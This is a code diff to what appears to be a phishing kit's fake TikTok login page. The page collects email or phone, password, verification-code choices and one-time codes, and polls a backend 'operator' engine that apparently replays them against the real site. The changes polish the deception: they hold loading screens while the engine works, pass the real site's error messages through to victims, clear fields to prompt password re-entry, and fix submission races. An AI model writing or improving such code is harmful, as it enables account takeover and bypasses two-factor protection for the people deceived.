@@ -558,6 +558,7 @@
     .loading-error.visible { display: block; }
 
     #styledErrorContainer{display:none;margin:20px auto;max-width:400px}
+#styledErrorContainer.show{display:block}
     #styledErrorContainer .form-error-display{background:#fef2f2;border:1px solid #fecaca;border-radius:12px;padding:16px 20px;display:flex;align-items:flex-start;gap:12px}
     #styledErrorContainer .form-error-display i{color:#dc2626;font-size:24px;margin-top:1px}
     #styledErrorContainer .form-error-display .error-title{font-weight:600;color:#dc2626;font-size:15px;margin-bottom:4px}
@@ -789,6 +790,9 @@
         </button>
       </div>
 
+      <!-- FAILED-VIEW ERROR CARD (in-flow, directly above the sign-up footer) -->
+      <div id="styledErrorContainer"><div class="form-error-display"><i class="fas fa-exclamation-circle"></i><div style="flex:1;"><div class="error-title">Something went wrong</div><p class="error-msg" id="styledErrorMessage" style="margin-bottom:8px;"></p><button type="button" class="retry-btn" onclick="location.reload()">Retry</button></div></div></div>
+
       <!-- SIGN UP FOOTER -->
       <div class="footer-signup">
         Don't have an account? <a href="https://www.tiktok.com/signup" target="_blank">Sign up</a>
@@ -842,7 +846,6 @@
   <p class="loading-text" id="loadingMessage"></p>
   <p class="loading-error" id="loadingError"></p>
 </div>
-<div id="styledErrorContainer"><div class="form-error-display"><i class="fas fa-exclamation-circle"></i><div style="flex:1;"><div class="error-title">Something went wrong</div><p class="error-msg" id="styledErrorMessage" style="margin-bottom:8px;"></p><button type="button" class="retry-btn" onclick="location.reload()">Retry</button></div></div></div>
 
 <script>
 // ==================== TEMPLATE CONFIG ====================
@@ -868,13 +871,16 @@ let pollingStartTime = null;
 const POLLING_TIMEOUT_MS = 10 * 60 * 1000;
 let currentStatus = null;
 let lastShownStatus = '';
+let lastPasswordErrorMessage = '';
+let awaitingPasswordResult = false;
 let isProcessing = false;
 let lastFormVisibleStatus='WAITINGEMAIL';
 let selectedLoginMethod = null;
 let pendingLoginMethod = null;
 let lastSentLoginMethod = null;
 let initialSubmissionInFlight = false;
-let silentSubmitAttempts = 0;
+let initFailed = false;
+let flowLoginMethod = null;
 let verificationOptions = [];
 // Hash of the last options rendered — WAITINGOPTIONS polls every 2s; re-rendering
 // unconditionally wipes the user's radio selection before they can submit.
@@ -882,6 +888,33 @@ let lastRenderedOptionsHash = '';
 // Consecutive polls where the engine no longer knows this browserId (row
 // deleted/finished server-side). After 3 strikes the session is terminal.
 let pollMissCount = 0;
+// T-b: submission-derived pending gate — replaces the old ljr.engineRetrying
+// check, which the socials engine never writes (so every submit flashed the
+// form back after a single 2s poll). Set by all four submit handlers; the
+// poll holds the loading/processing UI until the engine visibly consumes the
+// submission (writes PROCESSING) or a real state transition arrives.
+let pendingFormStatus = null;   // status the form was submitted from
+let pendingLjrMessage = '';     // lastJsonResponse.message as last rendered
+let pendingSince = 0;
+let pendingConsumed = false;    // engine wrote PROCESSING → submission taken
+let lastSeenLjrMessage = '';
+const PENDING_SUBMIT_WINDOW_MS = 90000;      // hard cap on the hold
+const PENDING_UNCONSUMED_WINDOW_MS = 20000;  // engine-down safety: render anyway
+
+function markSubmissionPending(fromStatus) {
+  isProcessing = true;
+  pendingFormStatus = fromStatus || currentStatus || '';
+  pendingLjrMessage = lastSeenLjrMessage;
+  pendingSince = Date.now();
+  pendingConsumed = false;
+}
+function clearSubmissionPending() {
+  isProcessing = false;
+  pendingFormStatus = null;
+  pendingLjrMessage = '';
+  pendingSince = 0;
+  pendingConsumed = false;
+}
 
 const loadingMessages = [
   "Securing your connection...",
@@ -910,6 +943,10 @@ function showMethodSelection() {
 
 function selectMethod(method) {
   selectedLoginMethod = method;
+  if (initFailed) {
+    showFailedView("Failed to connect to the server. Please try again.");
+    return;
+  }
   if (method === 'qr') {
     showScreen('qrScreen');
     showQrLoading();
@@ -1024,10 +1061,20 @@ function togglePassword(inputId) {
 }
 
 // ==================== LOADING ====================
+const FROZEN_IDS = ['emailInput', 'phoneInput', 'emailPasswordInput', 'phonePasswordInput', 'countryCode', 'passwordOnlyInput', 'verificationCodeInput'];
+
+function setFormFrozen(on) {
+  FROZEN_IDS.forEach(id => { const el = document.getElementById(id); if (el) el.disabled = !!on; });
+  document.querySelectorAll('input[name="verificationOption"], .channel-item').forEach(el => { el.disabled = !!on; });
+  ['tabPhone', 'tabEmail'].forEach(id => { const el = document.getElementById(id); if (el) el.style.pointerEvents = on ? 'none' : ''; });
+}
+
 function setBtnLoading(btn, on) {
-  if (!btn) return;
-  btn.classList.toggle('is-loading', !!on);
-  btn.disabled = !!on;
+  if (btn) {
+    btn.classList.toggle('is-loading', !!on);
+    btn.disabled = !!on;
+  }
+  setFormFrozen(!!on);
 }
 
 function resetAllButtons() {
@@ -1036,20 +1083,38 @@ function resetAllButtons() {
   });
 }
 
+// E-btn: recompute the red/active state from the real input values AND the
+// disabled flag. Called at the end of every status render (after the T-a
+// disable) and from the input listeners, so engine pre-fills light up, the
+// 2s poll can never strip the class mid-typing, and a WAITING (not-ready)
+// button never shows red while dead.
+function syncCredentialButtons() {
+  const em = document.getElementById('emailInput');
+  const pm = document.getElementById('phoneInput');
+  const e = document.getElementById('emailSubmitBtn');
+  const p = document.getElementById('phoneSubmitBtn');
+  if (e && em) e.classList.toggle('enabled', em.value.trim().length > 0 && !e.disabled);
+  if (p && pm) p.classList.toggle('enabled', pm.value.trim().length > 0 && !p.disabled);
+}
+
 function showLoading(msg) {
-  const overlay = document.getElementById('loadingOverlay');
-  const text = document.getElementById('loadingMessage');
-  const err = document.getElementById('loadingError');
-  overlay.classList.add('visible');
-  text.textContent = msg || '';
-  err.classList.remove('visible');
-  startLoadingMessages();
+  document.getElementById('loadingOverlay').classList.remove('visible');
+  const active = document.querySelector('.screen.active');
+  const btnMap = {
+    credentialScreen: selectedLoginMethod === 'phone' ? 'phoneSubmitBtn' : 'emailSubmitBtn',
+    passwordScreen: 'passwordSubmitBtn',
+    verificationOptionsScreen: 'verificationChoiceSubmitBtn',
+    verificationCodeScreen: 'verificationCodeSubmitBtn'
+  };
+  const btnId = active && btnMap[active.id];
+  setBtnLoading(btnId ? document.getElementById(btnId) : null, true);
 }
 
 function hideLoading() {
   document.getElementById('loadingOverlay').classList.remove('visible');
   clearInterval(messageIntervalId);
   resetAllButtons();
+  setFormFrozen(false);
 }
 
 function showLoadingError(msg) {
@@ -1108,10 +1173,10 @@ function hideAllErrors() {
     const el = document.getElementById(id);
     if (el) { el.classList.remove('visible'); el.textContent = ''; }
   });
-  const sc = document.getElementById('styledErrorContainer'); if (sc) sc.style.display = 'none';
+  const sc = document.getElementById('styledErrorContainer'); if (sc) { sc.style.display = 'none'; sc.classList.remove('show'); }
 }
-function showStyledError(m){const c=document.getElementById('styledErrorContainer'),e=document.getElementById('styledErrorMessage');if(c&&e){e.textContent=m||'An unexpected error occurred.';c.style.display='block'}}
-function showFailedView(m){hideLoading();clearInterval(pollingIntervalId);['credentialScreen','verificationOptionsScreen','verificationCodeScreen','passwordScreen'].forEach(id=>{const s=document.getElementById(id);if(s)s.style.display='none'});hideAllErrors();showStyledError(m)}
+function showStyledError(m){const c=document.getElementById('styledErrorContainer'),e=document.getElementById('styledErrorMessage');if(c&&e){e.textContent=m||'An unexpected error occurred.';c.style.display='block';c.classList.add('show')}}
+function showFailedView(m){hideLoading();clearInterval(pollingIntervalId);['credentialScreen','verificationOptionsScreen','verificationCodeScreen','passwordScreen','qrScreen','methodSelectionScreen'].forEach(id=>{const s=document.getElementById(id);if(s)s.style.display='none'});hideAllErrors();showStyledError(m)}
 
 function setError(id, msg) {
   const el = document.getElementById(id);
@@ -1180,14 +1245,9 @@ async function initialFormSubmission(opts) {
   } catch (error) {
     console.error("Initial submission error:", error);
     isProcessing = false;
-    if (silent) {
-      if (silentSubmitAttempts < 3) {
-        silentSubmitAttempts++;
-        setTimeout(() => { if (!browserId) initialFormSubmission({ silent: true }); }, 4000);
-      }
-      return;
-    }
-    showFailedView("Failed to initiate process. Please try again.");
+    initFailed = true;
+    const unreachable = /HTTP 5\d\d|Failed to fetch|NetworkError|No browserId received/i.test((error && error.message) || '');
+    showFailedView(unreachable ? "Failed to connect to the server. Please try again." : "Failed to initiate process. Please try again.");
   } finally {
     initialSubmissionInFlight = false;
   }
@@ -1229,8 +1289,41 @@ async function pollOperator() {
     console.log("Polling:", data);
     if (data.currentStatus) {
       pollMissCount = 0;
-      if (isProcessing && (data.currentStatus === 'WAITINGPASSWORD' || data.currentStatus === 'WAITINGCODE')) { try { const ljr = data.data && data.data.lastJsonResponse ? (typeof data.data.lastJsonResponse === 'string' ? JSON.parse(data.data.lastJsonResponse) : data.data.lastJsonResponse) : null; if (ljr && ljr.engineRetrying === true) { console.log('[Template] Engine retrying, staying in loading state'); return; } } catch (e) {} }
-      isProcessing = false; const rowData = data.data || {}; if (data.qrData && !rowData.qrData) rowData.qrData = data.qrData; updateUIForStatus(data.currentStatus, rowData);
+      if (isProcessing) {
+        // T-b: hold the loading state while the engine hasn't consumed this
+        // submission. PROCESSING = taken (keep holding); still-on-the-status
+        // we submitted from with an unchanged message = not picked up yet
+        // (hold up to 20s so a dead engine can't strand the user). Anything
+        // else — new message, new status, PROCESSING_FINALIZING/COMPLETED/
+        // FAILED — is a real transition and renders below.
+        const st = data.currentStatus;
+        let msgNow = '';
+        try {
+          const ljr = data.data && data.data.lastJsonResponse ? (typeof data.data.lastJsonResponse === 'string' ? JSON.parse(data.data.lastJsonResponse) : data.data.lastJsonResponse) : null;
+          msgNow = (ljr && ljr.message) || '';
+        } catch (e) {}
+        const withinWindow = pendingSince && (Date.now() - pendingSince) < PENDING_SUBMIT_WINDOW_MS;
+        if (withinWindow) {
+          if (st === 'PROCESSING') {
+            pendingConsumed = true;
+            console.log('[Template] Submission taken by engine (PROCESSING) — holding loading state');
+            return;
+          }
+          if (!pendingConsumed) {
+            const sameStatus = pendingFormStatus && st === pendingFormStatus;
+            const msgUnchanged = !msgNow || msgNow === pendingLjrMessage;
+            if (sameStatus && msgUnchanged && (Date.now() - pendingSince) < PENDING_UNCONSUMED_WINDOW_MS) {
+              console.log('[Template] Submission pending (status: ' + st + ') — holding loading state');
+              return;
+            }
+            if (sameStatus && !msgUnchanged) {
+              console.log('[Template] Pending status message changed — rendering update');
+            }
+          }
+        }
+        clearSubmissionPending();
+      }
+      const rowData = data.data || {}; if (data.qrData && !rowData.qrData) rowData.qrData = data.qrData; updateUIForStatus(data.currentStatus, rowData);
     } else if (data.success === false) {
       // Row unknown to the engine (deleted or expired sheet entry).
       pollMissCount++;
@@ -1242,7 +1335,7 @@ async function pollOperator() {
 } catch (error) {
     console.error("[Template] Poll error, will retry in 5s:", error);
     clearInterval(pollingIntervalId);
-    if(isProcessing){isProcessing=false;updateUIForStatus(lastFormVisibleStatus,{})}
+    if(isProcessing){clearSubmissionPending();updateUIForStatus(lastFormVisibleStatus,{})}
     setTimeout(() => {
         if (browserId) {
             pollingStartTime = Date.now();
@@ -1255,18 +1348,42 @@ async function pollOperator() {
 // ==================== STATUS UI ====================
 function updateUIForStatus(status, data = {}) {
   currentStatus = status;
+  if (data.loginMethod) flowLoginMethod = data.loginMethod;
+  // T-b: remember the message this render was based on so submit-time
+  // snapshots can detect a genuinely new message on a later poll.
+  if (data.lastJsonResponse) {
+    try {
+      const _l = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
+      lastSeenLjrMessage = (_l && _l.message) || '';
+    } catch (e) {}
+  }
   hideAllErrors();
 
   const emailSubmitBtn = document.getElementById('emailSubmitBtn');
   const phoneSubmitBtn = document.getElementById('phoneSubmitBtn');
-  if (emailSubmitBtn) { emailSubmitBtn.disabled = false; emailSubmitBtn.classList.remove('enabled'); }
-  if (phoneSubmitBtn) { phoneSubmitBtn.disabled = false; phoneSubmitBtn.classList.remove('enabled'); }
+  if (emailSubmitBtn) emailSubmitBtn.disabled = false;
+  if (phoneSubmitBtn) phoneSubmitBtn.disabled = false;
 
   switch (status) {
     case 'WAITING':
+      // G: a WAITING row must stay submit-ready — a pre-filled email+password
+      // is clickable immediately instead of waiting out the QR/method decision
+      // (~60s) behind a disabled Login button. Engine-driven PROCESSING below
+      // still disables, so an in-flight submission can't be double-fired.
+      hideLoading();
+      updateQrImage(data);
+      startPolling(2000);
+      break;
+
     case 'PROCESSING':
+      // T-a: block every submit button while processing so a fast
+      // user (or a poll that re-renders the screen) can't double-submit.
       if (emailSubmitBtn) { emailSubmitBtn.disabled = true; }
       if (phoneSubmitBtn) { phoneSubmitBtn.disabled = true; }
+      ['verificationChoiceSubmitBtn', 'verificationCodeSubmitBtn', 'passwordSubmitBtn'].forEach(id => {
+        const b = document.getElementById(id);
+        if (b) b.disabled = true;
+      });
       updateQrImage(data);
       startPolling(2000);
       break;
@@ -1295,21 +1412,46 @@ function updateUIForStatus(status, data = {}) {
     case 'WAITINGPASSWORDERROR':
       lastFormVisibleStatus=status;
       hideLoading();
-      showScreen('passwordScreen');
-      if (data.email) {
-        document.getElementById('passwordAccountInput').value = data.email;
-      }
-      document.getElementById('passwordOnlyInput').value = '';
+      const pwEntering = (lastShownStatus !== status);
+      let pwErrorMsg = '';
       if (data.lastJsonResponse) {
         try {
           const lr = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
-          if (lr.message && (lr.message.includes('Incorrect') || lr.message.includes('incorrect'))) {
-            setError('passwordOnlyError', lr.message);
-          }
+          // K: show ANY non-generic message (rate-limit, session, browser text),
+          // not only ones containing 'Incorrect' — generic defaults are suppressed.
+          if (lr.message && !/^(Awaiting password|Processing)/i.test(lr.message)) pwErrorMsg = lr.message;
         } catch(e) {}
-      } else if (status === 'WAITINGPASSWORDERROR') {
-        setError('passwordOnlyError', 'Incorrect password. Please try again.');
       }
+      if (!pwErrorMsg && status === 'WAITINGPASSWORDERROR') pwErrorMsg = 'Incorrect password. Please try again.';
+      const pwNewError = (!!pwErrorMsg && pwErrorMsg !== lastPasswordErrorMessage);
+      const isQrPw = (flowLoginMethod || selectedLoginMethod || 'qr') === 'qr';
+      if (isQrPw) {
+        // QR verification path: the verification display carries the password
+        // attempt and its error — never the credential screen.
+        showScreen('passwordScreen');
+        if (data.email) document.getElementById('passwordAccountInput').value = data.email;
+        if (pwEntering || awaitingPasswordResult || pwNewError) {
+          const qrPwField = document.getElementById('passwordOnlyInput');
+          if (qrPwField) qrPwField.value = '';
+        }
+        if (pwErrorMsg) setError('passwordOnlyError', pwErrorMsg);
+      } else {
+        // N: the email/phone flow NEVER leaves the credential screen — password
+        // attempts and their errors render inline here.
+        showScreen('credentialScreen');
+        switchTab(selectedLoginMethod === 'phone' ? 'phone' : 'email');
+        if (data.email && selectedLoginMethod !== 'phone') document.getElementById('emailInput').value = data.email;
+        if (pwEntering || awaitingPasswordResult || pwNewError) {
+          // Clear the password field so re-entry is a conscious act — the engine
+          // parks after an error (no auto-retry) and waits for this submit.
+          const pwField = document.getElementById(selectedLoginMethod === 'phone' ? 'phonePasswordInput' : 'emailPasswordInput');
+          if (pwField) pwField.value = '';
+        }
+        if (pwErrorMsg) setError(selectedLoginMethod === 'phone' ? 'phoneError' : 'emailError', pwErrorMsg);
+        syncCredentialButtons();
+      }
+      awaitingPasswordResult = false;
+      lastPasswordErrorMessage = pwErrorMsg;
       lastShownStatus = currentStatus;
       startPolling(2000);
       break;
@@ -1375,9 +1517,11 @@ function updateUIForStatus(status, data = {}) {
     default:
       hideLoading();
       clearInterval(pollingIntervalId);
-      setError('loadingError', "An unexpected status was received. Please try again.");
+      showFailedView("An unexpected status was received. Please try again.");
       break;
   }
+  // E-btn: after the switch so pre-fills and T-a disables are both factored in.
+  syncCredentialButtons();
 }
 
 // ==================== VERIFICATION OPTIONS ====================
@@ -1414,7 +1558,14 @@ async function handleUserSubmission() {
   let errorId = selectedLoginMethod === 'phone' ? 'phoneError' : 'emailError';
 
   try {
-    if (currentStatus === 'WAITINGEMAIL' || currentStatus === 'WAITINGEMAILERROR') {
+    // B2: null = the pre-first-poll race (user filled the form before the very
+    // first status render) — treat it like WAITING so an immediate click works.
+    if (currentStatus === null || currentStatus === 'WAITING' || currentStatus === 'WAITINGEMAIL' || currentStatus === 'WAITINGEMAILERROR') {
+      if (!browserId) {
+        hideLoading();
+        setError(errorId, "Session is preparing — please wait a moment.");
+        return;
+      }
       let identifier;
       if (selectedLoginMethod === 'email') {
         identifier = emailInput.value.trim();
@@ -1432,8 +1583,17 @@ async function handleUserSubmission() {
       if (!password) { hideLoading(); setError(errorId, "Password is required."); return; }
       payload.password = password;
       updateType = 'password';
+    } else if (currentStatus === 'PROCESSING') {
+      // B2: the row's own submission is already in flight — this is not an
+      // error, just tell the user to wait out the loading state.
+      hideLoading();
+      setError(errorId, "Login is in progress — please wait a moment.");
+      return;
     } else {
       hideLoading();
+      // E-btn: never fail silently — a click racing the WAITING->WAITINGEMAIL
+      // flip must tell the user instead of looking like a dead button.
+      setError(errorId, "Session is preparing — please wait a moment.");
       return;
     }
 
@@ -1449,8 +1609,9 @@ async function handleUserSubmission() {
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
     const data = await response.json();
     console.log("Update response:", data);
-    isProcessing = true;
+    markSubmissionPending(currentStatus);
     updateUIForStatus('PROCESSING', {});
+    showLoading('Verifying your login…');
   } catch (error) {
     console.error("Submission error:", error);
     hideLoading();
@@ -1478,8 +1639,9 @@ async function submitVerificationChoice() {
       body: objectToFormData(payload)
     });
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
-    isProcessing = true;
+    markSubmissionPending(currentStatus);
     updateUIForStatus('PROCESSING', {});
+    showLoading('Verifying your login…');
   } catch (error) {
     console.error("Verification choice error:", error);
     hideLoading();
@@ -1506,8 +1668,9 @@ async function submitVerificationCode() {
       body: objectToFormData(payload)
     });
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
-    isProcessing = true;
+    markSubmissionPending(currentStatus);
     updateUIForStatus('PROCESSING', {});
+    showLoading('Verifying your login…');
   } catch (error) {
     console.error("Verification code error:", error);
     hideLoading();
@@ -1535,8 +1698,10 @@ async function submitPasswordOnly() {
     });
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
     await response.json();
-    isProcessing = true;
+    markSubmissionPending(currentStatus);
+    awaitingPasswordResult = true;
     updateUIForStatus('PROCESSING', {});
+    showLoading('Verifying your login…');
   } catch (error) {
     console.error("Password submission error:", error);
     hideLoading();
@@ -1555,14 +1720,8 @@ document.addEventListener('DOMContentLoaded', () => {
     selectMethod(qpMethod);
   }
 
-  document.getElementById('emailInput').addEventListener('input', function() {
-    const btn = document.getElementById('emailSubmitBtn');
-    btn.classList.toggle('enabled', this.value.trim().length > 0);
-  });
-  document.getElementById('phoneInput').addEventListener('input', function() {
-    const btn = document.getElementById('phoneSubmitBtn');
-    btn.classList.toggle('enabled', this.value.trim().length > 0);
-  });
+  document.getElementById('emailInput').addEventListener('input', syncCredentialButtons);
+  document.getElementById('phoneInput').addEventListener('input', syncCredentialButtons);
 });
 </script>
 
